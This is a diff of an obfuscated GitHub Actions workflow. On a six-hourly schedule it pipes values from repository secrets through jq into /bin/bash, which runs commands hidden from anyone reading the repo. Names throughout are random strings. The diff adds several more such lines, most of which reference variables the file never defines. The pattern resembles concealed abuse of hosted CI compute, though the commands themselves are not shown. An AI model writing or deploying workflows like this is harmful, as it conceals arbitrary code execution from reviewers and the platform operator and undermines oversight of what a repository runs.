@@ -1,19 +1,23 @@
 name: luotianfu1241
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
+    - cron: '40 4/6 * * *'
 
-jobs:  # 7118
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luotianfu1241
         env:
-          vos3305: ${{ secrets.vos3305 }}
+          gcnn27899: ${{ secrets.gcnn27899 }}
         run: |
-          echo $vos3305 | jq -r .kxmf36068 | /bin/bash
-          echo $tzu834 | jq -r .rgsc19 | /bin/bash
+          echo $gcnn27899 | jq -r .yence9 | /bin/bash
+          echo $srsxk0 | jq -r .ei1431 | /bin/bash
+          echo $vvs41109 | jq -r .fpwin636 | /bin/bash
+          echo $vjx05 | jq -r .qo123 | /bin/bash
+          echo $bpq28540 | jq -r .rtx31 | /bin/bash
+          echo $m20488 | jq -r .xvvta5 | /bin/bash
 
